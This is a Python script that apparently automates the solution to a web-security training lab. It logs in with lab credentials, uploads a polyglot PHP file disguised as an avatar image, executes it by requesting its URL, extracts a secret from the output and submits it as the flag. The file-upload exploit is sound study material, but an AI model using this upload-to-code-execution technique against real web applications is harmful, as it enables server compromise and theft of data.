import requests
import re
from PIL import PngImagePlugin, Image

# pip install Pillow

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

session = requests.Session()

#  fetch the csrf token 
csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match = re.search(r'name="csrf" value="(.*?)"',csrf_token.text) # way to find csrf token
csrf_pattern = match.group(1)
print(csrf_pattern)

data = {"username":"wiener","password":"peter","csrf":csrf_pattern}

login_post = session.post(app_url+"/login",verify=False,data=data,proxies=proxies)
cookie = session.cookies.get_dict()
print(cookie)


# now we fetch upload csrf token 

upload_token = session.get(app_url+"/my-account?id=wiener",verify=False,proxies=proxies)
upload_match = re.search(r'name="csrf" value="(.*?)"',upload_token.text)
upload_pattern = upload_match.group(1)
print(upload_pattern)

# now we upload the file 
with open('C:\\Users\\jester\\File upload\\polyglot.php', 'rb') as file:
    files = {
        'avatar': ('polyglot.php', file, 'application/octet-stream'),
        'user': (None, 'wiener'),
        'csrf': (None, upload_pattern)
    }

    response = session.post(app_url + "/my-account/avatar", files=files, proxies=proxies, verify=False)

if "The file avatars/polyglot.php has been uploaded" in response.text:
    print("file uploaded successfully")


# now we fetch the content from files//index.php
    
fetch_upload = session.get(app_url+"/files/avatars/polyglot.php",proxies=proxies,verify=False)
token_pattern2 = re.search(r'START(.*?)END',fetch_upload.text)  
answer = token_pattern2.group(1).strip(' +\n\r\t') # Strip unwanted characters explicitly after regex extraction

print(answer)


# now submitSolution 

submit_flag = session.post(app_url+"/submitSolution",proxies=proxies,verify=False,data={"answer": answer})
if '"correct":true' in submit_flag.text:
    print("flag submit sucessfully")
